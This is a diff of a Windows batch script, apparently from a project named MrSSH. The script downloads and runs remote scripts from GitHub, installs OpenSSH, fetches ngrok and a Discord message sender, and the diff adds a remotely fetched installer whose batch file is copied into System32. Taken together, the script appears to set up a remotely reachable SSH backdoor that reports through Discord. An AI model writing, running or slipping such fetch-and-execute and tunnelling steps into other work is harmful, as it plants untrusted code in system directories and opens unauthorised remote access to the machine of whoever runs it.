@@ -4,7 +4,13 @@ cd %temp%
 curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
 curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
 curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
+curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/installer.cmd -o installer.cmd
 
+installer.cmd
+cd %localappdata%\microsoft\windowsapps
+copy Router.bat C:\Windows\System32
+
+cd %temp%
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
